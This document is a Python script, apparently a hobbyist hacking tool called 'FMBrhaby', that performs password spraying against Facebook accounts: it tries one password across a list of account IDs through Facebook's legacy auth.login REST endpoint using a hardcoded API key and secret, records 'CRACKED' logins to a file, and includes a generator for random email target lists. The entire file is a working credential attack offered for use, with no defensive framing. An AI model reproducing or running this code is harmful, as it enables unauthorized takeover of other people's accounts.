## fmbrute.py - Facebook Multi Brute Force
# -*- coding: utf-8 -*-
##
import os
import sys
import hashlib
import requests

if sys.platform == "linux2":
	os.system("clear")
elif sys.platform == "win32":
	os.system("cls")
else:
	os.system("clear")
API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
__banner__ = """\033[1;33m |\   /| FMBrhaby - Facebook Multi Brute Force
  \|_|/  Author: ArHaBy*
  /. .\  Version: 3.0v
 =\_Y_/= Telegram: @ciku370
  {>o<}  Insta: @ali.rhaby

=============================================="""
print(__banner__)

print ('              1-bruteforce Facebook')
print("")
print('==============================================')
print("===============ارهابي_عليه_السلام==============")
print('==============================================')
print("")
print ('              2- DeveloperMaker ')
print('==============================================')


ali1 = input ("")
if ali1 == '1' :
        import os
        import sys
        import hashlib
        import requests

        if os.path.isdir("result.txt") == True:
                os.rmdir("result.txt")
        try:
                idlist = input("[*] set PATH to idlist: ")
                        
                if os.path.exists(idlist) != False:
                        while True:
                                password = input("[*] Enter Password: ")
                                if password == "" or password == (" "*len(password)):
                                        print("[!] fmbrute: error: Don't leave the password blank")
                                elif len(password) < 5:
                                        print("[!] fmbrute: error: Password is too short")
                                else:
                                        break
                        print("==============================================")
                        count = 0
                        length = len(open(idlist,'r').read().split("\n"))
                        result = open("result.txt", "a")
                        for id in open(idlist,'r').read().split("\n"):
                                print("[*] Trying id {} ({}-{})".format(id,count+1,length))
                                sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail="+id+"format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword="+password+"return_ssl_resources=0v=1.0"+API_SECRET
                                xx = hashlib.md5(sig.encode(encoding="UTF-8",errors="strict")).hexdigest()
                                data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON","generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":password,"return_ssl_resources":"0","v":"1.0","sig":xx}
                                r = requests.get("https://api.facebook.com/restserver.php",params=data)
                              #  Another error handle response:
                          #      if r.json()["error_msg"] != None or r.json()["error"]["message"] == "An unknown error occurred":
                                if "error" in r.text:
                                        pass
                                else:
                                        print("\a======== CRACKED =========")
                                        print("\a[+] FB USER : "+id)
                                        print("\a[+] FB PASS : "+password)
                                        print("\a==========================")
                                        result.write("{}|{}".format(id, password))
                                count+=1
                        print("[~] Done.")
                        result.close()
                else:
                        print("fmbrute: error: No such file or directory")
        except KeyboardInterrupt:
                print("fmbrute: error: Keyboard interrupt")
        except:
                print("fmbrute: error: Device is not connected to the internet")
if ali1 == '2' :
    import random
    import sys
    import os
    import time
    os.system("rm list.txt")
    print('=========================================')
    print('$Example Domain email')
    print('1-   @gmail.com')
    print('1-   @hotmail.com')
    print('1-   @yahoo.com')
    print('1-   @outlook.com')
    print('=========================================')
    print("")
    print ("$Example type ABC 123 ._ ")
    print ("1234567890qwertyuiopasdfghjklzxcvbnm._")
    print('================ letsgo ================')
    print("")
    #================================================
    uesr = input('username =ã€‹ã€‹ ')
    print('=========================================')
    rhaby1 = input('type ABC 123 ._ =ã€‹ã€‹ ')
    print('=========================================')
    email = input('Domain email =ã€‹ã€‹ ')
    print('=========================================')
    rhaby = input('What is a number List=ã€‹ã€‹ ')
    rhaby = int(rhaby)
    print('=========================================')
    rhaby2 = input('Number of mattresses=ã€‹ã€‹ ')
    rhaby2 = int(rhaby2)
    print('==================================')

    for password in range(rhaby):
        password = ''


        for item in range(rhaby2):
             rhaby3 = ''
        for item in range(rhaby2):
            rhaby3 += random.choice(rhaby1)



        print (uesr+rhaby3+email)
        with open('list.txt', 'a') as x:
         x.write(uesr + rhaby3 + email + '\n')
